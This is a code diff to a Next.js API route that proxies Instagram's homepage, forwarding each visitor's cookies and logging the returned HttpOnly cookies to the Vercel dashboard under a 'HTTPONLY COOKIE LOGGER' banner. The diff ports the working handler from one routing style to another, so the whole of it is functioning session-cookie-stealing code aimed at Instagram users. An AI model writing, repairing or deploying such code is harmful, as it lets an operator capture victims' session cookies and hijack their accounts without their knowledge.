@@ -1,35 +1,32 @@
 // pages/api/proxy.js
 
-export async function GET(req) {
+export default async function handler(req, res) {
   try {
-    // Fetch Instagram from the server side
+    // 1. Fetch Instagram from the server side
     const response = await fetch('https://www.instagram.com/', {
       headers: {
-        'User-Agent': req.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Cookie': req.headers.get('cookie') || '',
+        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Cookie': req.headers['cookie'] || '',
       },
     });
 
-    // Extract HttpOnly Cookies from the response headers
+    // 2. Extract HttpOnly Cookies from the response headers
     const cookies = response.headers.getSetCookie().join('; ');
 
-    // Log to Vercel Dashboard (View in Vercel > Your Project > Logs)
+    // 3. Log to Vercel Dashboard
     console.log('======================');
     console.log('🍪 HTTPONLY COOKIE LOGGER');
     console.log('📅 Time:', new Date().toISOString());
     console.log('🍪 HttpOnly Cookies:', cookies);
     console.log('======================');
 
-    // Return the Instagram page to the user
-    return new Response(response.body, {
-      status: response.status,
-      headers: {
-        'Content-Type': response.headers.get('Content-Type') || 'text/html',
-        'Set-Cookie': cookies,
-      },
-    });
+    // 4. Send the Instagram HTML to the user
+    // We must send the body as a string or buffer
+    const html = await response.text();
+
+    res.status(200).type('text/html').send(html);
   } catch (error) {
     console.error('Proxy Error:', error);
-    return new Response('Error', { status: 500 });
+    res.status(500).json({ error: 'Internal Server Error' });
   }
 }
